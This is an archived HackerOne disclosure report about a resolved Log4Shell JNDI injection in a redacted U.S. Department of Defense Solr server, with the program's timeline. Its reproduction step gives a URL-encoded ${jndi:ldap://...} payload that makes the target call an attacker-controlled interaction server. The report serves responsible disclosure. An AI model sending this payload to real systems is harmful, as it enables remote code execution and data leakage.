---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/code-injection
  - env/web
substate: "resolved"
weakness: "Code Injection"
enriched: true
body: true
date: 2022-09-06
submitted: 2022-07-08T14:08:07.860Z
bounty_usd: null
votes: 1
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "hachimanxienim"
source: "https://hackerone.com/reports/1631370"
title: "solr_log4j - http://██████████"
---
# solr_log4j - http://██████████

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 1 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2022-09-06

- Report: [https://hackerone.com/reports/1631370](https://hackerone.com/reports/1631370)
- CWE: Code Injection
- Submitted: 2022-07-08T14:08:07.860Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hi security team, i found a solr log4j vulnerability in your aplication

## Impact

Logging untrusted or user controlled data with a vulnerable version of Log4J may result in Remote Code Execution (RCE) against your application. This includes untrusted data included in logged errors such as exception traces, authentication failures, and other unexpected vectors of user controlled input

## System Host(s)
████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Just send get request to this path and change your interact server

PATH ----> http://████████/solr/admin/collections?action=$%7Bjndi:ldap://$%7BhostName%7D.YOURINTERACTSERVER/a%7D

## Suggested Mitigation/Remediation Actions

## Timeline

- **Report Filed**
- **2022-07-08** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **Report Needs More Info**
- **Report New**
- **2022-07-08** @hachimanxienim: Just send a request, because the delay is long, if not many requests can arrive at once
- **2022-07-08** @hachimanxienim: And sorry for the very long video, I can't edit with the h1 recorder
- **2022-07-08** @hachimanxienim: Any questions or information can ask me
- **Report Severity Updated**
- **Report Vulnerability Types Updated**
- **Report Triaged**
- **Report Resolved**
- **Agreed On Going Public**
- **2022-07-29** @agent-0g: Due to this and your other Log4J report, you are being considered for Researcher of the Month. If selected, would you like your real name listed on the certificate that is tweeted out? If not then we will use the H1 name of 0xhunster_. Is there a twitter handle you would like tagged in the tweet that goes out? If so, please provide us one. Thank you!
- **2022-07-29** @hachimanxienim: Yes I want my real name to be shown and I want to be tagged on twitter. Thank you very much.
- **2022-07-29** @agent-0g: @hachimanxienim Can you provide me that info along with your Twitter handle?
- **2022-07-29** @hachimanxienim: Name: Kenji Minei
Twitter: https://twitter.com/Hachiman_Xienim
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
